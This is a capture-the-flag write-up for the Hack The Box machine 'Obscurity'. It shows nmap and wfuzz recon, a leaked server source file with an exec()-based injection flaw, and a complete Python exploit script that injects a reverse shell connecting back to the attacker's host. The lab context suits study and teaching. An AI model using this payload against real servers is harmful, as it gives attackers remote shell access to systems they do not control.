# Obscurity

### Address: 10.10.10.168

### Recon
`sudo nmap -sS -T4 -O -p1-65535 10.10.10.168`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-07 18:30 EST
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 35.92% done; ETC: 18:32 (0:01:24 remaining)
Nmap scan report for 10.10.10.168
Host is up (0.015s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   closed http
8080/tcp open   http-proxy
9000/tcp closed cslistener
Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.18 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.16 (91%), Oracle VM Server 3.4.2 (Linux 4.1) (91%), Crestron XPanel control system (91%), Android 4.1.1 (91%), Adtran 424RG FTTH gateway (90%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.30 seconds
kali@kali:~$ sudo nmap -A -p22,80,8080,9000 10.10.10.168
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-07 18:34 EST
Nmap scan report for 10.10.10.168
Host is up (0.022s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sat, 07 Mar 2020 23:35:30
|     Server: BadHTTPServer
|     Last-Modified: Sat, 07 Mar 2020 23:35:30
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!--
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=3/7%Time=5E642F7E%P=x86_64-pc-linux-gnu%r(Get
SF:Request,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Sat,\x2007\x20Mar\x20202
SF:0\x2023:35:30\nServer:\x20BadHTTPServer\nLast-Modified:\x20Sat,\x2007\x
SF:20Mar\x202020\x2023:35:30\nContent-Length:\x204171\nContent-Type:\x20te
SF:xt/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\"e
SF:n\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>\n
SF:\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20nam
SF:e=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Templa
SF:te\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20sty
SF:lesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/boot
SF:strap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-aw
SF:esome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templat
SF:emo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-target=
SF:\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n<d
SF:iv\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinner-
SF:wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20S
SF:at,\x2007\x20Mar\x202020\x2023:35:30\nServer:\x20BadHTTPServer\nLast-Mo
SF:dified:\x20Sat,\x2007\x20Mar\x202020\x2023:35:30\nContent-Length:\x2041
SF:71\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<
SF:title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20con
SF:tent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20conten
SF:t=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\nEa
SF:sy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-prof
SF:ile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styleshe
SF:et\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\
SF:"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\
SF:"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\"s
SF:croll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20s
SF:ection\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"sk
SF:-spinner\x20sk-spinner-wordpress\">\n");
Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.18 (92%), Linux 3.16 (91%), Oracle VM Server 3.4.2 (Linux 4.1) (91%), Crestron XPanel control system (91%), Android 4.1.1 (91%), Android 4.2.2 (Linux 3.4) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 9000/tcp)
HOP RTT      ADDRESS
1   23.57 ms 10.10.14.1
2   28.85 ms 10.10.10.168

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.73 seconds
```

The web service page source code reveals the following.
```html
<h4 class="experience-title accent">Server Dev</h4>
<p class="education-description">Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory</p>
```

This provides a unique point for pivoting. `SuperSecureServer.py` must exist somewhere. We can use Wfuzz to enumerate possibilities.
`wfuzz -w /usr/share/wordlists/dirb/big.txt --hc 404 http://obscure.htb:8080/FUZZ/SuperSecureServer.py`
```
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://obscure.htb:8080/FUZZ/SuperSecureServer.py
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                     
===================================================================

000006016:   200        170 L    498 W    5892 Ch     "develop"                                                   

Total time: 90.29689
Processed Requests: 20469
Filtered Requests: 20468
Requests/sec.: 226.6855
```

Now pull the file down for further analysis.
`wget http://obscure.htb:8080/develop/SuperSecureServer.py`
The flaw in their code is seen here. The info variable line and exec function is the hole we need to inject a reverse shell.
```python
    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
```

Get creative, if you wish. The pre-text does not really matter.
```python
    #!/usr/bin/env python3
    from sys import argv
    import requests
    import urllib
    import os

    address = '{}/'.format(argv[3])
    revshell = 'SUCKITLOL\'' + '\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash", "-i"])\na=\''.format(argv[1], argv[2])
    payload = urllib.parse.quote(revshell)

    print(address + payload)
    RESPONSE = requests.get(address + payload)
    print(RESPONSE.headers)
    print(RESPONSE.text)
```

This reverse shell payload can be executed against the SuperSecureServer.py service running on tcp/8080.<br>
<img src="https://github.com/jworl/htb-notes/blob/master/Obscurity/Screen%20Shot%202020-03-08%20at%202.16.11%20PM.png?raw=true"><br>
